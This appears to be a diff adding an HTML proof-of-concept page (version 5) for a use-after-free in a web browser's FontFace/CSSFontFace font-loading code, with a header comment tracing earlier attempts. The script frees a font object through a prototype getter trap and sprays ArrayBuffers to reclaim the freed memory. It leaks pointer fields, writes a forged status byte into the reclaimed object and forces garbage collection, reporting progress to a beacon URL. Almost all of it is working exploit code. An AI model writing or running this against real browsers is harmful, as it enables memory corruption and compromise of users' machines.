@@ -1,0 +1,235 @@
+<!--
+  p653 v5: GC free-list leak — don't delete ffA from set
+
+  v1-v3: wrapper alive after 15s GC — hasPendingActivity blocks collection
+  v4: rc=2 seed + status=3 — still alive (wrong CSSFontFace targeted)
+
+  v5 root cause hypothesis: document.fonts.delete(this) in the trap
+  removes ffA from the set, stranding "fa" loading in Loading state.
+  ffA's REAL CSSFontFace (not our buffer) stays Loading forever →
+  hasPendingActivity()=true → GC never collects the wrapper.
+
+  Fix: DON'T delete ffA from the set in the trap. Let "fa" loading
+  complete (local(Helvetica) resolves fast). Then clear the set AFTER
+  loading completes, null everything, and GC should collect.
+
+  Also: wait for loadPromise to settle before GC (releases LoadRequest
+  refs inside FontFaceSet).
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p653</title></head>
+<body>p653v5: no-delete
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P653-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'v5-nodelete');
+flush();
+
+// Phase 1: FontFace UAF — NO delete in trap
+var ffA = new FontFace('fa', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+document.fonts.add(ffA);
+void ffA.loaded;
+
+var sty = document.createElement('style');
+sty.textContent = "@font-face { font-family: sa; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(sty);
+
+var fired = false;
+var bufs = [];
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (fired) return undefined;
+    fired = true;
+    // Free "sa" CSSFontFace via cascade rebuild
+    sty.remove();
+    // NOTE: NO document.fonts.delete(this) — let "fa" loading complete!
+    document.body.offsetHeight;
+    for (var i = 0; i < 64; i++) {
+      var ab = new ArrayBuffer(192);
+      var dv = new DataView(ab);
+      dv.setUint32(0x00, 2, true); // seed rc=2
+      bufs.push(new Uint8Array(ab));
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+var loadPromise = document.fonts.load('1em fa, sa', 'AB');
+
+// Track if loadPromise settles
+var lpSettled = false;
+var lpResult = '';
+loadPromise.then(function(faces) {
+  lpSettled = true;
+  lpResult = 'resolved:' + faces.length;
+}).catch(function(e) {
+  lpSettled = true;
+  lpResult = 'rejected:' + String(e).slice(0, 40);
+});
+
+setTimeout(function() {
+try {
+  var hit = -1;
+  for (var i = 0; i < bufs.length; i++) {
+    var dv = new DataView(bufs[i].buffer);
+    var rc = dv.getUint32(0x00, true);
+    if (rc !== 2) { hit = i; break; }
+  }
+  if (hit < 0) {
+    for (var i = 0; i < bufs.length; i++) {
+      var dv = new DataView(bufs[i].buffer);
+      if (dv.getUint32(0x58, true) !== 0 || dv.getUint32(0x5C, true) !== 0) {
+        hit = i; break;
+      }
+    }
+  }
+  if (hit < 0) { emit('MISS', 'ABORT lpSettled=' + lpSettled + ' ' + lpResult); flush(); return; }
+
+  var dv = new DataView(bufs[hit].buffer);
+  var rc   = dv.getUint32(0x00, true);
+  var T_lo = dv.getUint32(0x58, true);
+  var T_hi = dv.getUint32(0x5C, true);
+  var W_lo = dv.getUint32(0x68, true);
+  var W_hi = dv.getUint32(0x6C, true);
+
+  emit('P1', 'hit=' + hit + ' rc=' + rc +
+    ' T=' + hex32(T_hi) + hex32(T_lo) +
+    ' W=' + hex32(W_hi) + hex32(W_lo) +
+    ' lp=' + lpSettled + ':' + lpResult);
+  flush();
+
+  // Write status=3 (Success) at +0x82 for "sa" CSSFontFace in our buffer
+  // This may help fonts.load() Promise.all settle for "sa"
+  dv.setUint8(0x82, 3);
+
+  // Snapshot
+  var snap = [];
+  for (var i = 0; i < 192; i += 4) snap.push(dv.getUint32(i, true));
+
+  // WeakRef + FinalizationRegistry
+  var wr = new WeakRef(ffA);
+  var frFired = false;
+
+  if (typeof FinalizationRegistry !== 'undefined') {
+    var fr = new FinalizationRegistry(function() {
+      frFired = true;
+      emit('FR-FIRE', 'rc=' + dv.getUint32(0, true) + ' +4=0x' + hex32(dv.getUint32(4, true)));
+      flush();
+    });
+    try { fr.register(ffA, 'marker'); } catch(e) {}
+  }
+
+  // Phase 2: Wait for loadPromise to settle, THEN kill refs and GC
+  function startGC() {
+    emit('LP-STATUS', lpSettled + ':' + lpResult);
+
+    // Kill references
+    try { delete FontFace.prototype.then; } catch(e) {}
+    try { document.fonts.clear(); } catch(e) {}
+    loadPromise = null;
+    ffA = null;
+    sty = null;
+    fired = null;
+
+    emit('REFS-KILLED', 'set=' + document.fonts.size);
+    emit('GC-START', 'async 15s');
+    flush();
+
+    var pollCount = 0;
+    var maxPolls = 60;
+
+    function gcAndPoll() {
+      pollCount++;
+      var g = [];
+      for (var i = 0; i < 300; i++) g.push(new ArrayBuffer(65536));
+      g = null;
+
+      if (pollCount === 1 || pollCount === 5 || pollCount === 10 ||
+          pollCount === 20 || pollCount === 40 || pollCount === 60) {
+        var alive = wr.deref() !== undefined;
+        emit('WR', 'poll=' + pollCount + ' alive=' + alive + ' fr=' + frFired +
+          ' rc=' + dv.getUint32(0, true));
+        flush();
+
+        // Early exit if we see a change
+        if (!alive || frFired) {
+          var d = [];
+          for (var i = 0; i < 32; i += 4) d.push(hex32(dv.getUint32(i, true)));
+          emit('DUMP32', d.join(' '));
+          emit('FL', '0x' + hex32(dv.getUint32(4, true)) + hex32(dv.getUint32(0, true)));
+          flush();
+          return;
+        }
+      }
+
+      // Check buffer changes
+      var changed = false;
+      var changes = [];
+      for (var i = 0; i < 192; i += 4) {
+        var cur = dv.getUint32(i, true);
+        if (cur !== snap[i / 4]) {
+          changed = true;
+          changes.push('+' + i.toString(16) + ':' + hex32(snap[i/4]) + '>' + hex32(cur));
+        }
+      }
+      if (changed) {
+        emit('CHANGED', 'poll=' + pollCount + ' ' + changes.slice(0, 8).join(' '));
+        var d = [];
+        for (var i = 0; i < 32; i += 4) d.push(hex32(dv.getUint32(i, true)));
+        emit('DUMP32', d.join(' '));
+        flush();
+        return;
+      }
+
+      if (pollCount < maxPolls) {
+        setTimeout(gcAndPoll, 250);
+      } else {
+        emit('END', maxPolls + ' polls fr=' + frFired +
+          ' alive=' + (wr.deref() !== undefined) + ' rc=' + dv.getUint32(0, true));
+        flush();
+      }
+    }
+    setTimeout(gcAndPoll, 100);
+  }
+
+  // Wait up to 2s for loadPromise to settle, then start GC
+  var waitCount = 0;
+  function waitForSettle() {
+    waitCount++;
+    if (lpSettled || waitCount > 20) {
+      emit('SETTLE-WAIT', waitCount + ' lpSettled=' + lpSettled + ' ' + lpResult);
+      flush();
+      startGC();
+    } else {
+      setTimeout(waitForSettle, 100);
+    }
+  }
+  waitForSettle();
+
+} catch(topErr) { emit('FATAL', String(topErr).slice(0,200)); flush(); }
+}, 50);
+})();
+</script>
+</body></html>
